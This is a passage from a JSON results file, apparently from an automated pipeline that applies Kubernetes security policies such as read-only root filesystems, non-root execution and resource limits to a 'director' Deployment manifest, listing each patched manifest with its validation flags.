memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01084",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01085",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01086",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01087",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01088",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01089",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01090",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01091",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01092",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01093",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01094",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
